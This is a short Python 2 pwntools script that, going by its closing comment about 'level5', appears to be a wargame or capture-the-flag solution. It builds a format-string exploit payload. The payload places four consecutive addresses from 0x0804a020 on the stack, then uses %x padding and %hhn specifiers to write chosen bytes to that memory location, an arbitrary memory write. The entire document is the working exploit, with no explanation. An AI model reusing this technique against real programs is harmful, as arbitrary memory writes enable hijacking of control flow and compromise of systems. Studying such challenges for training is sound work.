from pwn import *
def pwn():
        payload = ''
        payload += p32(0x0804a020) # address to overwrite
        payload += p32(0x0804a020+1) # address +1 to overwrite
        payload += p32(0x0804a020+2) # address +2 to overwrite
        payload += p32(0x0804a020+3) # address +3 to overwrite
        payload += 'EFGH'
        payload += '%103x'
        payload += '%11$hhn'
        payload += '%266x'
        payload += '%12$hhn'
        payload += '%127x'
        payload += '%13$hhn'
        payload += '%1x'
        payload += '%14$hhn'
        print payload

pwn()

# I only upload level5 because the rest are too easy, no exploit needed :)
